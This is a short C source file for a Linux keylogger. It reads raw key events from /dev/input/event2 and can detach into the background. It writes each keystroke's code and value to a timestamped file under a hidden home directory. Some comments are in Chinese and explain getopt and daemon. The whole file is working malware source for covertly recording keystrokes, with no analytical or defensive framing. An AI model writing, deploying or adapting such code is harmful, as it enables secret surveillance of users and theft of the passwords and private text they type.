#include<string.h>
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<time.h>
#include<linux/input.h>
#include<fcntl.h>
/*
   struct input_event  
    {
        struct timeval time;
        __u16 type;
        __u16 code;
        __s32 value;
    };
*/
/*
void daemon()
{
    //this function has being define in unistd.h
}
*/
int main(int argc,char ** argv)
{
    int fd,sfd = -1;
    char ch;
    struct input_event kevent;
    char filepath[40];
    char buff[10];
    char *usage = "usage\n\t-b : run in background\n\t-f : output to a file\n";

    /*get thr system time as path */
    time_t now;
    struct tm *tm_now;
 
    time(&now);
    tm_now = localtime(&now);
 
    sprintf(filepath,"/home/alis/.keylog/%d-%d-%d-%d:%d:%d", tm_now->tm_year, tm_now->tm_mon, tm_now->tm_mday, tm_now->tm_hour, tm_now->tm_min, tm_now->tm_sec);



    if((fd=open("/dev/input/event2",O_RDONLY))==-1)
    {
        printf("usage: you must be root!\n");
        exit(0);
    }
    /*
     *int getopt(int argc, char * const argv[], const char *optstring);
     *a 后没有冒号，表示没有可以参数 
     *b 后跟一个冒号，表示有一个必要的参数 
     *c 后跟两个冒号，表示有一个可选的参数 
     *
     */ 
    while( ( ch = getopt( argc, argv, "hbf" ) ) != EOF ) 
    {
        //test for getopt
        switch(ch) 
        {
            case 'h':
                printf("%s",usage);
                exit(0);
                break;
            case 'b':
                daemon(0,0);
                break;
            case 'f':
               sfd=open(filepath,O_WRONLY|O_CREAT|O_APPEND,0444);
               if(sfd==-1)
                    exit(1);
                printf("the arg is %s\n",filepath);
               break;
            default:
                break;

        }
    }
   
    /*
    *extern int daemon(int nochdir,int noclose);
    *run in background,
    *if nochdir is zero do 'chdir ("/")',
    *if ni closer is zero redirects stdin stdout stderr to /dev/null
    */
    while(1)
        {
            if(read(fd,&kevent,sizeof(kevent)) == sizeof(kevent))
               {
                   if(kevent.type==EV_KEY && sfd!=-1)
                   {
                       sprintf(buff,"%u-%d\n",kevent.code,kevent.value);
                       //printf("type:%u \t code:%u \t value%d \n",kevent.type,kevent.code,kevent.value);
                       write(sfd,buff,strlen(buff));
                   }
               } 
        }
    return 0;
}
